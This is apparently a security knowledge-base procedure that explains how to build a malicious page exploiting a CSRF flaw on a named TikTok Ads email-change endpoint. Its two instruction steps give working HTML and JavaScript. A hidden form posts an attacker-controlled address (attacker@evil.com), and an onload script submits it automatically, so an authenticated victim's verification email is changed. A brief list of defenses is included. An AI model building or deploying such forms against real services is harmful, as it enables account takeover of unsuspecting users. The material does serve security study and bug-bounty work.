---
tags:
  - csrf
  - exploit
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2022-04-05'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:50.411Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7d0212eb-d12e-43e4-bf93-4afe498d2659
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-CSRF-Form

## Summary

This procedure details the creation of a malicious HTML form that exploits a CSRF vulnerability by automatically submitting a forged request to change the victim's user verification email on the TikTok Ads platform.

## Description

CSRF attacks rely on the victim's browser sending authenticated requests to the target site. Here, an HTML page with a hidden form and auto-submit JavaScript targets the vulnerable endpoint. The form mimics the legitimate parameters (e.g., new_email) to perform the unauthorized action. This is effective against endpoints lacking anti-CSRF measures and requires hosting on an attacker-controlled domain.

## Requirements

1. Knowledge of the vulnerable endpoint URL and parameters from reconnaissance
2. Text editor (e.g., VS Code) for HTML/JS creation
3. Web server to host the malicious page (e.g., local Python server or GitHub Pages)

## Defense

Defensive measures and detection strategies:

- Require unique CSRF tokens per request
- Enforce referrer policy checks
- Log and alert on cross-origin state changes

## Objectives

1. Build a payload that submits the desired email change
2. Ensure automatic execution without victim interaction
3. Test the form locally before deployment

## Instructions

### Step 1: Define Form Structure

**Context**: Create the basic HTML form with hidden inputs matching the endpoint's expected parameters.

Write the HTML as follows:

```html
<form action="https://ads.tiktok.com/account/verification/email/update" method="POST" id="exploit-form">
    <input type="hidden" name="new_email" value="attacker@evil.com">
    <!-- Add other required params if any -->
</form>
```

**Expected Output**: Valid form syntax targeting the endpoint.

### Step 2: Add Auto-Submit Functionality

**Context**: Use JavaScript to submit the form immediately upon page load.

Append the script:

```html
<script>
    window.onload = function() {
        document.getElementById('exploit-form').submit();
    };
</script>
```

Test by opening the HTML file in a browser while authenticated to a test account.

**Expected Output**: Automatic form submission and email change if vulnerable.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf-exploit]]
- [[html-payload]]
